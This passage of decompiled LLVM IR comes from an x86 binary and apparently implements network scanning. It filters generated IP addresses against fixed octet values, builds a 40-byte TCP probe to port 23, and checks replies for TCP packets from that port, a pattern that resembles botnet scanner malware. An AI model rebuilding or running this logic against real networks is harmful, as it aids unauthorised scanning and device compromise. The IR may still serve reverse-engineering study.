  %v9_80503ba = icmp eq i8 %v4_804e2e1, -64
  %tmp756 = and i1 %v9_80503ba, %notlhs532
  br i1 %tmp756, label %dec_label_pc_804e2d1, label %dec_label_pc_804ef25

dec_label_pc_804ef25:                             ; preds = %dec_label_pc_804ef15, %dec_label_pc_804ef05
  %v1_804ef25 = add i32 %v0_804edcf, 46
  %v2_804ef25 = inttoptr i32 %v1_804ef25 to i8*
  %v3_804ef25 = load i8, i8* %v2_804ef25, align 1
  %v4_804ef25 = icmp eq i8 %v3_804ef25, 0
  br i1 %v4_804ef25, label %dec_label_pc_804ef35, label %dec_label_pc_804ef2c

dec_label_pc_804ef2c:                             ; preds = %dec_label_pc_804ef25
  %v0_804ef2c = load i32, i32* @ebx, align 4
  %v1_804ef2c = trunc i32 %v0_804ef2c to i8
  %v10_804ef2c = icmp ne i8 %v1_804ef2c, 71
  %or.cond264 = or i1 %tmp739, %v10_804ef2c
  %or.cond264.not = xor i1 %or.cond264, true
  %or.cond265 = and i1 %v1_80508cb, %or.cond264.not
  br i1 %or.cond265, label %dec_label_pc_804e2d1, label %dec_label_pc_804ef35

dec_label_pc_804ef35:                             ; preds = %dec_label_pc_804ef2c, %dec_label_pc_804ef25
  %v10_804ef35 = icmp eq i8 %v1_804ede5, 98
  br i1 %v10_804ef35, label %dec_label_pc_8050315, label %dec_label_pc_804ef3e

dec_label_pc_804ef3e:                             ; preds = %dec_label_pc_8050315, %dec_label_pc_804ef35
  br i1 %v4_804ee24, label %dec_label_pc_804ef53, label %dec_label_pc_804ef45

dec_label_pc_804ef45:                             ; preds = %dec_label_pc_804ef3e
  %v0_804ef45 = load i32, i32* @ebx, align 4
  %tmp757 = and i32 %v0_804ef45, 252
  %tmp758 = icmp eq i32 %tmp757, 20
  br i1 %tmp758, label %dec_label_pc_804e2d1, label %dec_label_pc_804ef53

dec_label_pc_804ef53:                             ; preds = %dec_label_pc_804ef45, %dec_label_pc_804ef3e
  %v10_804ef53 = icmp eq i8 %v1_804ede5, 35
  br i1 %v10_804ef53, label %dec_label_pc_80502a8, label %dec_label_pc_804ef5c

dec_label_pc_804ef5c:                             ; preds = %dec_label_pc_80502a8, %dec_label_pc_804ef53
  %v10_804ef5c = icmp eq i8 %v1_804ede5, 52
  %v1_804ef5f = zext i1 %v10_804ef5c to i32
  %v4_804ef5f = or i32 %v1_804ef5f, %v3_804ede8
  store i32 %v4_804ef5f, i32* %eax.global-to-local, align 4
  %v1_804ef62 = add i32 %v0_804edcf, 62
  %v2_804ef62 = inttoptr i32 %v1_804ef62 to i8*
  %v3_804ef62 = load i8, i8* %v2_804ef62, align 1
  %v4_804ef62 = icmp eq i8 %v3_804ef62, 0
  %v4_804ef76 = icmp eq i1 %v10_804ef5c, false
  br i1 %v4_804ef62, label %dec_label_pc_804ef76, label %dec_label_pc_804ef69

dec_label_pc_804ef69:                             ; preds = %dec_label_pc_804ef5c
  br i1 %v4_804ef76, label %dec_label_pc_804ef88, label %dec_label_pc_804ef6d

dec_label_pc_804ef6d:                             ; preds = %dec_label_pc_804ef69
  %v0_804ef6d = load i32, i32* @ebx, align 4
  %v1_804ef6d = trunc i32 %v0_804ef6d to i8
  %tmp759 = icmp ult i8 %v1_804ef6d, 95
  br i1 %tmp759, label %dec_label_pc_804e2d1, label %dec_label_pc_804ef7a

dec_label_pc_804ef76:                             ; preds = %dec_label_pc_804ef5c
  br i1 %v4_804ef76, label %dec_label_pc_804ef88, label %dec_label_pc_804ef76.dec_label_pc_804ef7a_crit_edge

dec_label_pc_804ef76.dec_label_pc_804ef7a_crit_edge: ; preds = %dec_label_pc_804ef76
  %v0_804ef7a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ef7a

dec_label_pc_804ef7a:                             ; preds = %dec_label_pc_804ef76.dec_label_pc_804ef7a_crit_edge, %dec_label_pc_804ef6d
  %v0_804ef7a = phi i32 [ %v0_804ef7a.pre, %dec_label_pc_804ef76.dec_label_pc_804ef7a_crit_edge ], [ %v0_804ef6d, %dec_label_pc_804ef6d ]
  %v1_804ef7a = trunc i32 %v0_804ef7a to i8
  %tmp760 = icmp ugt i8 %v1_804ef7a, 94
  %v11_804ef7f = icmp eq i8 %v1_804ef7a, -1
  %v1_804ef82 = icmp eq i1 %v11_804ef7f, false
  %or.cond239 = and i1 %tmp760, %v1_804ef82
  br i1 %or.cond239, label %dec_label_pc_804e2d1, label %dec_label_pc_804ef88

dec_label_pc_804ef88:                             ; preds = %dec_label_pc_804ef7a, %dec_label_pc_804ef76, %dec_label_pc_804ef69
  %v10_804ef88 = icmp eq i8 %v1_804ede5, 54
  %v1_804ef8b = zext i1 %v10_804ef88 to i32
  %v4_804ef8b = or i32 %v1_804ef8b, %v3_804ede8
  store i32 %v4_804ef8b, i32* %eax.global-to-local, align 4
  %v1_804ef8e = add i32 %v0_804edcf, 69
  %v2_804ef8e = inttoptr i32 %v1_804ef8e to i8*
  %v3_804ef8e = load i8, i8* %v2_804ef8e, align 1
  %v4_804ef8e = icmp eq i8 %v3_804ef8e, 0
  %v4_804efa2 = icmp eq i1 %v10_804ef88, false
  br i1 %v4_804ef8e, label %dec_label_pc_804efa2, label %dec_label_pc_804ef95

dec_label_pc_804ef95:                             ; preds = %dec_label_pc_804ef88
  br i1 %v4_804efa2, label %dec_label_pc_804efb4, label %dec_label_pc_804ef99

dec_label_pc_804ef99:                             ; preds = %dec_label_pc_804ef95
  %v0_804ef99 = load i32, i32* @ebx, align 4
  %v1_804ef99 = trunc i32 %v0_804ef99 to i8
  %tmp761 = icmp ult i8 %v1_804ef99, 95
  br i1 %tmp761, label %dec_label_pc_804e2d1, label %dec_label_pc_804efa6

dec_label_pc_804efa2:                             ; preds = %dec_label_pc_804ef88
  br i1 %v4_804efa2, label %dec_label_pc_804efb4, label %dec_label_pc_804efa2.dec_label_pc_804efa6_crit_edge

dec_label_pc_804efa2.dec_label_pc_804efa6_crit_edge: ; preds = %dec_label_pc_804efa2
  %v0_804efa6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804efa6

dec_label_pc_804efa6:                             ; preds = %dec_label_pc_804efa2.dec_label_pc_804efa6_crit_edge, %dec_label_pc_804ef99
  %v0_804efa6 = phi i32 [ %v0_804efa6.pre, %dec_label_pc_804efa2.dec_label_pc_804efa6_crit_edge ], [ %v0_804ef99, %dec_label_pc_804ef99 ]
  %v1_804efa6 = trunc i32 %v0_804efa6 to i8
  %tmp762 = icmp ugt i8 %v1_804efa6, -113
  %v11_804efab = icmp eq i8 %v1_804efa6, -1
  %v1_804efae = icmp eq i1 %v11_804efab, false
  %or.cond240 = and i1 %tmp762, %v1_804efae
  br i1 %or.cond240, label %dec_label_pc_804e2d1, label %dec_label_pc_804efb4

dec_label_pc_804efb4:                             ; preds = %dec_label_pc_804efa6, %dec_label_pc_804efa2, %dec_label_pc_804ef95
  %v10_804efb4 = icmp eq i8 %v1_804ede5, 13
  %v1_804efb7 = icmp eq i1 %v10_804efb4, false
  br i1 %v1_804efb7, label %dec_label_pc_804efd5, label %dec_label_pc_804efb9

dec_label_pc_804efb9:                             ; preds = %dec_label_pc_804efb4
  %v0_804efb9 = load i32, i32* @ebx, align 4
  %v1_804efb9 = trunc i32 %v0_804efb9 to i8
  switch i8 %v1_804efb9, label %dec_label_pc_804efd5 [
    i8 114, label %dec_label_pc_804e2d1
    i8 113, label %dec_label_pc_804e2d1
    i8 112, label %dec_label_pc_804e2d1
    i8 59, label %dec_label_pc_804e2d1
    i8 58, label %dec_label_pc_804e2d1
    i8 57, label %dec_label_pc_804e2d1
    i8 56, label %dec_label_pc_804e2d1
    i8 55, label %dec_label_pc_804e2d1
    i8 54, label %dec_label_pc_804e2d1
    i8 53, label %dec_label_pc_804e2d1
    i8 52, label %dec_label_pc_804e2d1
  ]

dec_label_pc_804efd5:                             ; preds = %dec_label_pc_804efb9, %dec_label_pc_804efb4
  %v1_804efd5 = add i32 %v0_804edcf, 59
  %v2_804efd5 = inttoptr i32 %v1_804efd5 to i8*
  %v3_804efd5 = load i8, i8* %v2_804efd5, align 1
  %v4_804efd5 = icmp eq i8 %v3_804efd5, 0
  br i1 %v4_804efd5, label %dec_label_pc_804efe5, label %dec_label_pc_804efdc

dec_label_pc_804efdc:                             ; preds = %dec_label_pc_804efd5
  %v0_804efdc = load i32, i32* @ebx, align 4
  %v1_804efdc = trunc i32 %v0_804efdc to i8
  %v11_804efdc = icmp eq i8 %v1_804efdc, -84
  br i1 %v11_804efdc, label %dec_label_pc_804e2d1, label %dec_label_pc_804efe5

dec_label_pc_804efe5:                             ; preds = %dec_label_pc_804efdc, %dec_label_pc_804efd5
  %v3_804efe5 = load i8, i8* %v2_80507fc, align 1
  %v4_804efe5 = icmp eq i8 %v3_804efe5, 0
  br i1 %v4_804efe5, label %dec_label_pc_80502d6, label %dec_label_pc_804eff0

dec_label_pc_804eff0:                             ; preds = %dec_label_pc_804efe5
  %v0_804eff0 = load i32, i32* @ebx, align 4
  %v1_804eff0 = trunc i32 %v0_804eff0 to i8
  %tmp763 = icmp ult i8 %v1_804eff0, 15
  br i1 %tmp763, label %dec_label_pc_80502d6, label %dec_label_pc_804eff9

dec_label_pc_804eff9:                             ; preds = %dec_label_pc_804eff0
  %v11_804eff9 = icmp eq i8 %v1_804eff0, -1
  %v1_804effc = icmp eq i1 %v11_804eff9, false
  br i1 %v1_804effc, label %dec_label_pc_804e2d1, label %dec_label_pc_804f002

dec_label_pc_804f002:                             ; preds = %dec_label_pc_80502df, %dec_label_pc_80502d6, %dec_label_pc_804eff9
  %v1_804f002 = add i32 %v0_804edcf, 50
  %v2_804f002 = inttoptr i32 %v1_804f002 to i8*
  %v3_804f002 = load i8, i8* %v2_804f002, align 1
  %notlhs535 = icmp eq i8 %v3_804f002, 0
  %notrhs536 = icmp ne i8 %v1_804ede5, -44
  %or.cond243.not = or i1 %notrhs536, %notlhs535
  %tmp764 = icmp ult i8 %v4_804e2e1, -32
  %or.cond258 = or i1 %tmp764, %or.cond243.not
  %or.cond258.not = xor i1 %or.cond258, true
  %or.cond259 = and i1 %v1_80508cb, %or.cond258.not
  br i1 %or.cond259, label %dec_label_pc_804e2d1, label %dec_label_pc_804f012

dec_label_pc_804f012:                             ; preds = %dec_label_pc_804f002
  %v1_804f012 = add i32 %v0_804edcf, 78
  %v2_804f012 = inttoptr i32 %v1_804f012 to i8*
  %v3_804f012 = load i8, i8* %v2_804f012, align 1
  %v4_804f012 = icmp ne i8 %v3_804f012, 0
  %v10_804f019 = icmp eq i8 %v1_804ede5, 89
  %or.cond244 = and i1 %v10_804f019, %v4_804f012
  br i1 %or.cond244, label %dec_label_pc_80502fe, label %dec_label_pc_804f022

dec_label_pc_804f022:                             ; preds = %dec_label_pc_804f012
  switch i8 %v1_804ede5, label %dec_label_pc_804f034 [
    i8 -37, label %dec_label_pc_8050291
    i8 23, label %dec_label_pc_805027a
  ]

dec_label_pc_804f034:                             ; preds = %dec_label_pc_80502fe, %dec_label_pc_8050291, %dec_label_pc_805027a, %dec_label_pc_804f022
  %v1_804f034 = add i32 %v0_804edcf, 54
  %v2_804f034 = inttoptr i32 %v1_804f034 to i8*
  %v3_804f034 = load i8, i8* %v2_804f034, align 1
  %v4_804f034 = icmp eq i8 %v3_804f034, 0
  br i1 %v4_804f034, label %dec_label_pc_804f049, label %dec_label_pc_804f03b

dec_label_pc_804f03b:                             ; preds = %dec_label_pc_804f034
  %v0_804f03b = load i32, i32* @ebx, align 4
  %v1_804f03b = trunc i32 %v0_804f03b to i8
  %v10_804f040 = icmp eq i8 %v1_804f03b, 62
  br i1 %v10_804f040, label %dec_label_pc_804e2d1, label %dec_label_pc_804f049

dec_label_pc_804f049:                             ; preds = %dec_label_pc_804f03b, %dec_label_pc_804f034
  switch i8 %v1_804ede5, label %dec_label_pc_804f064 [
    i8 106, label %dec_label_pc_8050263
    i8 34, label %dec_label_pc_805024c
    i8 87, label %dec_label_pc_805001f
  ]

dec_label_pc_804f08f.thread:                      ; preds = %dec_label_pc_805001f, %dec_label_pc_805024c, %dec_label_pc_8050263
  store i32 %v3_804ede8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f09f

dec_label_pc_804f064:                             ; preds = %dec_label_pc_804f049
  %v10_804f064 = icmp eq i8 %v1_804ede5, 86
  %v1_804f067 = zext i1 %v10_804f064 to i32
  %v4_804f067 = or i32 %v1_804f067, %v3_804ede8
  store i32 %v4_804f067, i32* %eax.global-to-local, align 4
  %v4_804f06a = icmp eq i1 %v10_804f064, false
  br i1 %v4_804f06a, label %dec_label_pc_804f086, label %dec_label_pc_804f06e

dec_label_pc_804f06e:                             ; preds = %dec_label_pc_804f064
  %v0_804f06e = load i32, i32* @ebx, align 4
  %v1_804f06e = trunc i32 %v0_804f06e to i8
  %v8_804f06e = icmp eq i8 %v1_804f06e, -48
  br i1 %v8_804f06e, label %dec_label_pc_804e2d1, label %dec_label_pc_804f077

dec_label_pc_804f077:                             ; preds = %dec_label_pc_804f06e
  %v1_804f077 = add i32 %v0_804edcf, 44
  %v2_804f077 = inttoptr i32 %v1_804f077 to i8*
  %v3_804f077 = load i8, i8* %v2_804f077, align 1
  %v4_804f077 = icmp eq i8 %v3_804f077, 0
  br i1 %v4_804f077, label %dec_label_pc_804f086, label %dec_label_pc_804e2d1

dec_label_pc_804f086:                             ; preds = %dec_label_pc_804f077, %dec_label_pc_804f064
  %v11_804f086 = icmp eq i8 %v1_804ede5, -63
  br i1 %v11_804f086, label %dec_label_pc_8050011, label %dec_label_pc_804f08f

dec_label_pc_804f08f:                             ; preds = %dec_label_pc_804f086
  %v1_804f08f = add i32 %v0_804edcf, 60
  %v2_804f08f = inttoptr i32 %v1_804f08f to i8*
  %v3_804f08f = load i8, i8* %v2_804f08f, align 1
  %v4_804f08f = icmp ne i8 %v3_804f08f, 0
  %v10_804f096 = icmp eq i8 %v1_804ede5, 120
  %or.cond247 = and i1 %v10_804f096, %v4_804f08f
  br i1 %or.cond247, label %dec_label_pc_8050036, label %dec_label_pc_804f09f

dec_label_pc_804f09f:                             ; preds = %dec_label_pc_804f08f.thread, %dec_label_pc_8050011, %dec_label_pc_804f08f, %dec_label_pc_8050036
  %v1_804f09f = add i32 %v0_804edcf, 81
  %v2_804f09f = inttoptr i32 %v1_804f09f to i8*
  %v3_804f09f = load i8, i8* %v2_804f09f, align 1
  %v4_804f09f = icmp eq i8 %v3_804f09f, 0
  br i1 %v4_804f09f, label %dec_label_pc_804f0b1, label %dec_label_pc_804f0a6

dec_label_pc_804f0a6:                             ; preds = %dec_label_pc_804f09f
  %v1_804f0a6 = add i32 %v0_804edcf, 56
  %v2_804f0a6 = inttoptr i32 %v1_804f0a6 to i8*
  %v3_804f0a6 = load i8, i8* %v2_804f0a6, align 1
  %v4_804f0a6 = icmp eq i8 %v3_804f0a6, 0
  %v1_804f0ab = icmp eq i1 %v4_804f0a6, false
  br i1 %v1_804f0ab, label %dec_label_pc_804e2d1, label %dec_label_pc_804f0b1

dec_label_pc_804f0b1:                             ; preds = %dec_label_pc_804f0a6, %dec_label_pc_804f09f
  switch i8 %v1_804ede5, label %dec_label_pc_804f0ba.dec_label_pc_804f0c3_crit_edge [
    i8 78, label %dec_label_pc_8050003
    i8 -32, label %dec_label_pc_804e2d1
  ]

dec_label_pc_804f0ba.dec_label_pc_804f0c3_crit_edge: ; preds = %dec_label_pc_804f0b1
  %v0_804f0cb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f0c3

dec_label_pc_804f0c3:                             ; preds = %dec_label_pc_8050003, %dec_label_pc_804f0ba.dec_label_pc_804f0c3_crit_edge
  %v0_804f0cb = phi i32 [ %v0_804f0cb.pre, %dec_label_pc_804f0ba.dec_label_pc_804f0c3_crit_edge ], [ %v0_8050003, %dec_label_pc_8050003 ]
  store i16 0, i16* bitcast (i32* @global_var_80556aa.13 to i16*), align 4
  %v1_804f0cb = mul i32 %v0_804f0cb, 65536
  %v2_804f0d6 = and i32 %v1_804f0cb, 16711680
  %v2_804f0d9 = mul i32 %v0_804ede5, 16777216
  %v1_804f0c55 = mul nuw nsw i32 %v2_804e2e1, 256
  %v2_804f0dc = and i32 %v1_804f0c55, 65280
  store i32 %v2_804f0dc, i32* %edx.global-to-local, align 4
  %v2_804f0df = or i32 %v2_804f0d6, %v2_804f0d9
  %v0_804f0e1 = load i32, i32* @edi, align 4
  %v1_804f0e3 = urem i32 %v0_804f0e1, 256
  store i32 %v1_804f0e3, i32* %eax.global-to-local, align 4
  %v2_804f0e8 = or i32 %v2_804f0df, %v1_804f0e3
  store i32 %v2_804f0e8, i32* %ecx.global-to-local, align 4
  %v2_804f0ea = add i32 %v0_804edcf, -4
  %v3_804f0ea = inttoptr i32 %v2_804f0ea to i32*
  store i32 %v1_804f0e3, i32* %v3_804f0ea, align 4
  %v0_804f0eb = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0eb = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f0eb = or i32 %v1_804f0eb, %v0_804f0eb
  %v0_804f0ed = load i32, i32* %eax.global-to-local, align 4
  %v2_804f0ed = add i32 %v0_804edcf, -8
  %v3_804f0ed = inttoptr i32 %v2_804f0ed to i32*
  store i32 %v0_804f0ed, i32* %v3_804f0ed, align 4
  %v1_804f0ee = trunc i32 %v2_804f0eb to i16
  %v2_804f0ee = call i16 @llvm.bswap.i16(i16 %v1_804f0ee)
  %v3_804f0ee = zext i16 %v2_804f0ee to i32
  %v1_804f0f2 = udiv i32 %v2_804f0eb, 65536
  %v2_804f0f2 = mul nuw i32 %v3_804f0ee, 65536
  %v1_804f0f5 = trunc i32 %v1_804f0f2 to i16
  %v2_804f0f5 = call i16 @llvm.bswap.i16(i16 %v1_804f0f5)
  %v3_804f0f5 = zext i16 %v2_804f0f5 to i32
  %v6_804f0f5 = or i32 %v3_804f0f5, %v2_804f0f2
  store i32 %v6_804f0f5, i32* %edx.global-to-local, align 4
  %v1_804f0f9 = add i32 %v0_804edcf, -12
  %v2_804f0f9 = inttoptr i32 %v1_804f0f9 to i32*
  store i32 20, i32* %v2_804f0f9, align 4
  %v0_804f0fb = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f0fb, i32* @global_var_80556b0.14, align 16
  %v1_804f101 = add i32 %v0_804edcf, -16
  %v2_804f101 = inttoptr i32 %v1_804f101 to i32*
  store i32 ptrtoint (i32* @global_var_80556a0.15 to i32), i32* %v2_804f101, align 4
  %v0_804f106 = call i32 @function_804bd90()
  %v1_804f106 = trunc i32 %v0_804f106 to i16
  store i16 %v1_804f106, i16* bitcast (i32* @global_var_80556aa.13 to i16*), align 4
  %v0_804f111 = load i32, i32* @global_var_80556b0.14, align 16
  store i32 %v0_804f111, i32* %eax.global-to-local, align 4
  %v0_804f116 = load i32, i32* @esp, align 4
  %v1_804f116 = add i32 %v0_804f116, -4
  %v2_804f116 = inttoptr i32 %v1_804f116 to i32*
  store i32 20, i32* %v2_804f116, align 4
  store i16 5888, i16* @global_var_80556b6.16, align 2
  %v1_804f121 = add i32 %v0_804f116, -8
  %v2_804f121 = inttoptr i32 %v1_804f121 to i32*
  store i32 5120, i32* %v2_804f121, align 4
  %v0_804f126 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804f126, i32* @global_var_80556b8.17, align 8
  %v1_804f12b = add i32 %v0_804f116, -12
  %v2_804f12b = inttoptr i32 %v1_804f12b to i32*
  store i32 ptrtoint (i32* @global_var_80556b4.18 to i32), i32* %v2_804f12b, align 4
  store i16 0, i16* bitcast (i32* @global_var_80556c4.19 to i16*), align 4
  %v1_804f139 = add i32 %v0_804f116, -16
  %v2_804f139 = inttoptr i32 %v1_804f139 to i32*
  store i32 ptrtoint (i32* @global_var_80556a0.15 to i32), i32* %v2_804f139, align 4
  %v0_804f13e = call i32 @function_804bde0()
  %v1_804f13e = trunc i32 %v0_804f13e to i16
  store i16 %v1_804f13e, i16* bitcast (i32* @global_var_80556c4.19 to i16*), align 4
  %v0_804f149 = load i32, i32* @global_var_80556b0.14, align 16
  %v1_804f14e = load i32, i32* @esp, align 4
  %v2_804f14e = add i32 %v1_804f14e, 1928
  %v3_804f14e = inttoptr i32 %v2_804f14e to i32*
  store i32 %v0_804f149, i32* %v3_804f14e, align 4
  %v0_804f155 = load i16, i16* @global_var_80556b6.16, align 2
  %v2_804f15b = load i32, i32* @esp, align 4
  %v3_804f15b = add i32 %v2_804f15b, 1926
  %v4_804f15b = inttoptr i32 %v3_804f15b to i16*
  store i16 %v0_804f155, i16* %v4_804f15b, align 2
  %v0_804f163 = load i32, i32* @esp, align 4
  %v1_804f163 = add i32 %v0_804f163, 1924
  %v2_804f163 = inttoptr i32 %v1_804f163 to i16*
  store i16 2, i16* %v2_804f163, align 2
  %v0_804f16d = load i32, i32* @esp, align 4
  %v0_804f170 = load i32, i32* @global_var_805571c.20, align 4
  store i32 %v0_804f170, i32* %eax.global-to-local, align 4
  %v1_804f175 = add i32 %v0_804f16d, 20
  %v2_804f175 = inttoptr i32 %v1_804f175 to i32*
  store i32 16, i32* %v2_804f175, align 4
  %v1_804f177 = add i32 %v0_804f16d, 1924
  store i32 %v1_804f177, i32* %ecx.global-to-local, align 4
  %v2_804f17e = add i32 %v0_804f16d, 16
  %v3_804f17e = inttoptr i32 %v2_804f17e to i32*
  store i32 %v1_804f177, i32* %v3_804f17e, align 4
  %v1_804f17f = add i32 %v0_804f16d, 12
  %v2_804f17f = inttoptr i32 %v1_804f17f to i32*
  store i32 16384, i32* %v2_804f17f, align 4
  %v1_804f184 = add i32 %v0_804f16d, 8
  %v2_804f184 = inttoptr i32 %v1_804f184 to i32*
  store i32 40, i32* %v2_804f184, align 4
  %v1_804f186 = add i32 %v0_804f16d, 4
  %v2_804f186 = inttoptr i32 %v1_804f186 to i32*
  store i32 ptrtoint (i32* @global_var_80556a0.15 to i32), i32* %v2_804f186, align 4
  %v0_804f18b = load i32, i32* %eax.global-to-local, align 4
  %v3_804f18b = inttoptr i32 %v0_804f16d to i32*
  store i32 %v0_804f18b, i32* %v3_804f18b, align 4
  %v0_804f18c = call i32 @function_8051c49()
  store i32 %v0_804f18c, i32* %eax.global-to-local, align 4
  %v0_804f191 = load i32, i32* @esp, align 4
  %v1_804f191 = add i32 %v0_804f191, 1964
  %v2_804f191 = inttoptr i32 %v1_804f191 to i32*
  %v3_804f191 = load i32, i32* %v2_804f191, align 4
  %v1_804f198 = add i32 %v3_804f191, 1
  store i32 %v1_804f198, i32* %eax.global-to-local, align 4
  store i32 %v1_804f198, i32* %v2_804f191, align 4
  %v0_804f1a0 = load i32, i32* @esp, align 4
  %v1_804f1a0 = add i32 %v0_804f1a0, 32
  %v0_804f1a3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f1a3 = add i32 %v0_804f1a3, -383
  %v6_804f1a3 = sub i32 382, %v0_804f1a3
  %v7_804f1a3 = and i32 %v6_804f1a3, %v0_804f1a3
  %v8_804f1a3 = icmp slt i32 %v7_804f1a3, 0
  %v9_804f1a3 = icmp eq i32 %v1_804f1a3, 0
  %v10_804f1a3 = icmp slt i32 %v1_804f1a3, 0
  %v3_804f1a8 = icmp ne i1 %v10_804f1a3, %v8_804f1a3
  %v4_804f1a8 = or i1 %v9_804f1a3, %v3_804f1a8
  br i1 %v4_804f1a8, label %dec_label_pc_804e290, label %dec_label_pc_804f1ae

dec_label_pc_804f1ae:                             ; preds = %dec_label_pc_804f0c3
  %v0_804f1ae = load i32, i32* @esi, align 4
  %v2_804f1ae = add i32 %v0_804f1a0, 60
  %v3_804f1ae = inttoptr i32 %v2_804f1ae to i32*
  store i32 %v0_804f1ae, i32* %v3_804f1ae, align 4
  br label %dec_label_pc_804f1b2

dec_label_pc_804f1b2:                             ; preds = %.loopexit, %dec_label_pc_804f1ae
  %v1_804f1b2 = call i32 @function_8051a1b(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f1b2, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804f1b9 = load i32, i32* @esp, align 4
  %v2_804f1b9 = add i32 %v1_804f1b9, 104
  %v3_804f1b9 = inttoptr i32 %v2_804f1b9 to i32*
  store i32 %v1_804f1b2, i32* %v3_804f1b9, align 4
  br label %dec_label_pc_804f1bd

dec_label_pc_804f1bd:                             ; preds = %dec_label_pc_804f262, %dec_label_pc_804f25a, %dec_label_pc_804f252, %dec_label_pc_804f23b, %dec_label_pc_804f22c, %dec_label_pc_804f220, %dec_label_pc_804f216, %dec_label_pc_804f207, %dec_label_pc_804f202, %dec_label_pc_804f2c8, %dec_label_pc_804f1b2
  %v0_804f1bd = load i32, i32* @esp, align 4
  %v1_804f1bd = add i32 %v0_804f1bd, 104
  %v2_804f1bd = inttoptr i32 %v1_804f1bd to i32*
  %v3_804f1bd = load i32, i32* %v2_804f1bd, align 4
  store i32 %v3_804f1bd, i32* %eax.global-to-local, align 4
  %v1_804f1c1 = inttoptr i32 %v3_804f1bd to i32*
  store i32 0, i32* %v1_804f1c1, align 4
  %v0_804f1c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f1c7 = load i32, i32* @esp, align 4
  %v2_804f1c7 = add i32 %v1_804f1c7, -4
  %v3_804f1c7 = inttoptr i32 %v2_804f1c7 to i32*
  store i32 %v0_804f1c7, i32* %v3_804f1c7, align 4
  %v0_804f1c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f1c8 = add i32 %v1_804f1c7, -8
  %v3_804f1c8 = inttoptr i32 %v2_804f1c8 to i32*
  store i32 %v0_804f1c8, i32* %v3_804f1c8, align 4
  %v1_804f1c9 = add i32 %v1_804f1c7, -12
  %v2_804f1c9 = inttoptr i32 %v1_804f1c9 to i32*
  store i32 0, i32* %v2_804f1c9, align 4
  %v1_804f1cb = add i32 %v1_804f1c7, -16
  %v2_804f1cb = inttoptr i32 %v1_804f1cb to i32*
  store i32 0, i32* %v2_804f1cb, align 4
  %v1_804f1cd = add i32 %v1_804f1c7, -20
  %v2_804f1cd = inttoptr i32 %v1_804f1cd to i32*
  store i32 16384, i32* %v2_804f1cd, align 4
  %v1_804f1d2 = add i32 %v1_804f1c7, -24
  %v2_804f1d2 = inttoptr i32 %v1_804f1d2 to i32*
  store i32 1514, i32* %v2_804f1d2, align 4
  %v0_804f1d7 = load i32, i32* @global_var_805571c.20, align 4
  store i32 %v0_804f1d7, i32* %eax.global-to-local, align 4
  %v1_804f1dc = add i32 %v1_804f1c7, 122
  store i32 %v1_804f1dc, i32* %edx.global-to-local, align 4
  %v2_804f1e3 = add i32 %v1_804f1c7, -28
  %v3_804f1e3 = inttoptr i32 %v2_804f1e3 to i32*
  store i32 %v1_804f1dc, i32* %v3_804f1e3, align 4
  %v0_804f1e4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f1e4 = add i32 %v1_804f1c7, -32
  %v3_804f1e4 = inttoptr i32 %v2_804f1e4 to i32*
  store i32 %v0_804f1e4, i32* %v3_804f1e4, align 4
  %v0_804f1e5 = call i32 @function_8051bd3()
  store i32 %v0_804f1e5, i32* %eax.global-to-local, align 4
  %v0_804f1ea = load i32, i32* @esp, align 4
  %tmp142 = icmp slt i32 %v0_804f1e5, 1
  br i1 %tmp142, label %dec_label_pc_804f2f8, label %dec_label_pc_804f1f5

dec_label_pc_804f1f5:                             ; preds = %dec_label_pc_804f1bd
  %v1_804f1f5 = add i32 %v0_804f1ea, 136
  %v2_804f1f5 = inttoptr i32 %v1_804f1f5 to i32*
  %v3_804f1f5 = load i32, i32* %v2_804f1f5, align 4
  store i32 %v3_804f1f5, i32* %ecx.global-to-local, align 4
  %v1_804f1f9 = inttoptr i32 %v3_804f1f5 to i32*
  %v2_804f1f9 = load i32, i32* %v1_804f1f9, align 4
  %v11_804f1f9 = icmp eq i32 %v2_804f1f9, 11
  br i1 %v11_804f1f9, label %dec_label_pc_804f2f8, label %dec_label_pc_804f202

dec_label_pc_804f202:                             ; preds = %dec_label_pc_804f1f5
  %tmp765 = icmp ult i32 %v0_804f1e5, 40
  br i1 %tmp765, label %dec_label_pc_804f1bd, label %dec_label_pc_804f207

dec_label_pc_804f207:                             ; preds = %dec_label_pc_804f202
  %v1_804f207 = add i32 %v0_804f1ea, 170
  %v2_804f207 = inttoptr i32 %v1_804f207 to i32*
  %v3_804f207 = load i32, i32* %v2_804f207, align 4
  store i32 %v3_804f207, i32* %eax.global-to-local, align 4
  %v1_804f20e = load i32, i32* @global_var_80556fc.11, align 4
  %v12_804f20e = icmp eq i32 %v3_804f207, %v1_804f20e
  %v1_804f214 = icmp eq i1 %v12_804f20e, false
  br i1 %v1_804f214, label %dec_label_pc_804f1bd, label %dec_label_pc_804f216

dec_label_pc_804f216:                             ; preds = %dec_label_pc_804f207
  %v1_804f216 = add i32 %v0_804f1ea, 163
  %v2_804f216 = inttoptr i32 %v1_804f216 to i8*
  %v3_804f216 = load i8, i8* %v2_804f216, align 1
  %v12_804f216 = icmp eq i8 %v3_804f216, 6
  %v1_804f21e = icmp eq i1 %v12_804f216, false
  br i1 %v1_804f21e, label %dec_label_pc_804f1bd, label %dec_label_pc_804f220

dec_label_pc_804f220:                             ; preds = %dec_label_pc_804f216
  %v1_804f220 = add i32 %v0_804f1ea, 174
  %v2_804f220 = inttoptr i32 %v1_804f220 to i16*
  %v3_804f220 = load i16, i16* %v2_804f220, align 2
  %v9_804f220 = icmp eq i16 %v3_804f220, 5888
  %v1_804f22a = icmp eq i1 %v9_804f220, false
  br i1 %v1_804f22a, label %dec_label_pc_804f1bd, label %dec_label_pc_804f22c

dec_label_pc_804f22c:                             ; preds = %dec_label_pc_804f220
  %v1_804f22c = add i32 %v0_804f1ea, 58
